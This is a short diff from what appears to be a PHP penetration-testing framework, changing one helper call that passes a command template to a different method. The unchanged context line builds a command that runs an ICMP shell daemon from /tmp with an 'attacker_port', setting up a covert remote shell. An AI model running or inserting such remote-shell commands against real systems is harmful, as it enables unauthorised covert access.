@@ -295,7 +295,7 @@ This can be handy to get a list of processes and their PID number.");
 
         
         $template_id_euid = "echo '%ID%' | /tmp/ISHELL-v0.2/ishd -i 65535 -t $this->attacker_port -p 1024";
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
         
         
     }
